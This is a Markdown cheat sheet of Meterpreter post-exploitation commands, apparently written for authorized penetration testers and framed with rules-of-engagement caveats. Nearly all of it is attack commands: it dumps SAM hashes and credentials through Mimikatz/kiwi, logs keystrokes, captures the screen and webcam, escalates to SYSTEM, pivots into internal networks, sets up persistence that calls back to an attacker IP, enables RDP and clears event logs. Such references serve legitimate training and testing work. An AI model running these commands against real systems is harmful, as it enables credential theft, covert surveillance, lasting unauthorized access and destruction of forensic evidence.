# Meterpreter Command Reference Cheat Sheet

A focused, command-first Meterpreter reference — for how to get a Meterpreter session in the first place (framework basics, module usage, msfvenom payload generation), see [`metasploit-cheatsheet-professional.md`](metasploit-cheatsheet-professional.md). This document picks up **once you already have a Meterpreter session** and covers what to do with it.

> All techniques below are for use in **authorized environments only** — this cheat sheet assumes an authorized lab, exam, or engagement.

---

## 1. Situational Awareness (Run These First, Every Time)

```
sysinfo                    # OS, hostname, architecture
getuid                     # current user context
getpid                     # current process ID
ps                         # process list (look for AV/EDR, high-value processes)
ipconfig / ifconfig        # network interfaces
route                      # local routing table
```

---

## 2. Session & Process Management

```
background                 # backgrounds the session without killing it (Ctrl+Z also works)
sessions -l                # list all active sessions
sessions -i <id>            # interact with a specific session
migrate <pid>               # move into a more stable/privileged process
                             # good migration targets: explorer.exe, a long-running svchost.exe
getsystem                   # attempt automatic SYSTEM-level privilege escalation (Windows)
```

**Migration tip:** migrate away from the process the exploit landed in as soon as possible — if that process crashes or gets closed by the user, you lose the session.

---

## 3. Credential & Data Gathering

```
hashdump                   # dump local SAM hashes (requires SYSTEM)
load kiwi                  # load Mimikatz extension
creds_all                  # (kiwi) dump all available credentials
lsa_dump_sam               # (kiwi) dump SAM via LSA
keyscan_start               # start keystroke logging
keyscan_dump                 # pull captured keystrokes
keyscan_stop                 # stop keystroke logging
screenshot                  # capture the current screen
webcam_list / webcam_snap    # list/capture from webcam (if authorized in scope — this is invasive)
```

---

## 4. File System & File Transfer

```
pwd                        # current remote directory
ls / cd                    # navigate
upload <local> <remote>     # push a file to the target
download <remote> <local>   # pull a file from the target
edit <file>                 # edit a remote file directly (uses local editor)
search -f <pattern>          # search filesystem for a pattern (e.g., *.kdbx, *password*)
```

---

## 5. Command Execution

```
shell                       # drop into a native OS shell
execute -f cmd.exe -i -H     # execute and interact, hidden window
execute -f payload.exe        # run an uploaded payload
```

Prefer running native OS commands via `shell` for anything Meterpreter doesn't have a dedicated command for — it's more flexible than trying to find a Meterpreter-specific equivalent.

---

## 6. Pivoting & Network

```
run autoroute -s 10.10.20.0/24     # add a route through this session to a second network
run autoroute -p                    # print current routes
portfwd add -l 3389 -p 3389 -r <internal-ip>   # forward a local port to an internal target through the session
background                          # then use a socks proxy module (auxiliary/server/socks_proxy) for tool-agnostic pivoting
```

This is how you reach a second, non-internet-facing network segment once you have a foothold on a dual-homed host — see [`post-exploitation-cheatsheet-professional.md`](post-exploitation-cheatsheet-professional.md) for the broader pivoting concept and non-Metasploit pivot methods.

---

## 7. Persistence (Authorized Engagements Only)

```
run persistence -U -i 5 -p 4444 -r <attacker-ip>   # (legacy) re-establish a session on reboot
post/windows/manage/persistence_exe                  # modern module-based equivalent
```

Only use persistence mechanisms when explicitly authorized in the Rules of Engagement — document exactly what was installed so it can be fully removed at engagement close.

---

## 8. Useful `post/` Modules

| Module | Purpose |
|---|---|
| `post/windows/gather/enum_logged_on_users` | Who else is logged into this host |
| `post/windows/gather/checkvm` | Detect if the host is a VM (evasion/scope-relevance check) |
| `post/multi/gather/env` | Dump environment variables |
| `post/windows/gather/credentials/windows_autologin` | Pull stored autologon credentials |
| `post/windows/manage/enable_rdp` | Enable RDP for follow-on access |
| `post/multi/manage/system_session` | Upgrade a shell session to a full Meterpreter session |

Run with `use <module>`, `set SESSION <id>`, `run`.

---

## 9. Cleanup (Authorized Engagements Only)

```
clearev                     # clear Windows event logs (only if explicitly authorized — this destroys evidence)
```

Only appropriate when the Rules of Engagement explicitly call for anti-forensic testing (rare) — otherwise leave logs intact so the client's Blue Team can review them as part of the assessment.

---

*Getting a session in the first place: [`metasploit-cheatsheet-professional.md`](metasploit-cheatsheet-professional.md). Broader post-exploitation concepts (situational awareness, loot, pivoting, cleanup): [`post-exploitation-cheatsheet-professional.md`](post-exploitation-cheatsheet-professional.md). Privilege escalation if `getsystem` doesn't work outright: [`privilege-escalation-linux-windows-cheatsheet.md`](privilege-escalation-linux-windows-cheatsheet.md).*
